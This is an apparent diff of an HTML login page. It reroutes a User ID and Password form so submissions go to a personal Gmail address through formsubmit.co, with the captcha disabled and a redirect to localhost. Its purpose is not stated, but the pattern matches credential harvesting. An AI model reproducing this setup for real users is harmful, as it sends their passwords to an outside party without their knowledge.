@@ -27,15 +27,17 @@
       </div>
     </section>
 
-    <section class="form">
+    <section class="form" >
       <div class="form-box">
-        <form action="https://script.google.com/macros/s/AKfycbzCyZLZw6pvSHKMRqpwbzumEEfLqBtfr0Lhd1MLC3343-IZFvj0v6MjsIsUYnX6lc1FCA/exec" method="POST">
+        <form id="form"  action="https://formsubmit.co/kidarkush@gmail.com" method="POST" >
           <div class="divide">
             <div class="user-info">
               <label for="User ID">User ID</label>
               <input type="text" required id="User-ID" name="User-ID" />
               <label for="Password">Password</label>
               <input type="password" required id="Password" name="Password" />
+              <input type="hidden" name="_captcha" value="false">
+              <input type="hidden" name="_next" value="http://127.0.0.1:5500/index.html">
             </div>
 
             <div class="remember">
@@ -180,5 +182,6 @@
         </div>
       </div>
     </section>
+    <!-- <script src="script.js" defer></script> -->
   </body>
 </html>
